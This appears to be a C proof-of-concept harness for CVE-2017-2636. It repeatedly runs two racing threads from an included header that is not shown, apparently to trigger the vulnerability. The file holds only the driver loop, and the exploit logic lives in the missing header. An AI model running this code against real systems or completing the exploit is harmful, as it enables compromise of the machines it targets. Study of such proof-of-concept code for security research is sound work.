/*
 * cve-2017-2636 PoC
 */
#define _GNU_SOURCE
#include <pthread.h>

#include "../cves/cve-2017-2636.h"

int main(int argc, char *argv[]) {
  while (1) {
    pthread_t pth0, pth1;
    cve_2017_2636_init();
    pthread_create(&pth0, NULL, cve_2017_2636_th1, NULL);
    pthread_create(&pth1, NULL, cve_2017_2636_th2, NULL);
    pthread_join(pth0, NULL);
    pthread_join(pth1, NULL);
    cve_2017_2636_destroy();
  }

  return 0;
}
